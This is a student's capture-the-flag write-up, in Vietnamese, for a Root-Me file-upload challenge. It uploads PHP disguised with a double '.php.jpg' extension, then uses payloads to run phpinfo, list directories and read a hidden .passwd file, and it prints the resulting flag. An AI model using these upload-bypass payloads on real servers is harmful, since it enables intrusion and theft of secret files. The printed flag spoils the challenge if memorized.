# Challenge: File upload - Double extensions
## Người làm:   
    Nguyễn Ngọc Trưởng - 19522440
    Thời gian:
## Link: 
    https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions

- Thử thách như một trình xem ảnh
<p align="center"><img src="./images/6.1.png"></p>

- Dạo quanh trang web thì có một nơi upload file, những file upload phải có phần mở rộng là png, jpg `only .gif, .jpeg and .png are accepted`
<p align="center"><img src="./images/6.2.png"></p>
<p align="center"><img src="./images/6.3.png"></p>
<p align="center"><img src="./images/6.4.png"></p>
<p align="center"><img src="./images/6.5.png"></p>

- Thử thách có đề cập tới `Double extensions` do vậy ta thử tạo một file php, nhưng lại thêm một phần mở rộng khác là jpg. Tạo file với tên `a.php.jpg` có nội dung.
> `<?php echo phpinfo(); ?>`

- Khi đó ta thấy đã thực thi được file
<p align="center"><img src="./images/6.6.png"></p>

- Liệt kê các file hiện tại với payload
> `<?php $scan=scandir("."); foreach($scan as $file){echo "$file\n";} ?>  `
#ls galerie/upload/e67ff4a2f42984fe8bf237d3c876fddf

> `<?php $scan=scandir("../"); foreach($scan as $file){echo "$file\n";} ?>  `
#ls galerie/upload/

> `<?php $scan=scandir("../../"); foreach($scan as $file){echo "$file\n";} ?>  `
#ls galerie/

> `<?php $scan=scandir("../../../"); foreach($scan as $file){echo "$file\n";} ?>  `
#ls /
<p align="center"><img src="./images/6.7.png"></p>

- Vậy tệp tin .passwd nằm tại `../../../.passwd` ta tiến hành đọc file này với payload
> `<?php $data = file_get_contents("../../../.passwd"); echo $data; ?>`
<p align="center"><img src="./images/6.8.png"></p>

## Kết quả password là `Gg9LRz-hWSxqqUKd77-_q-6G8`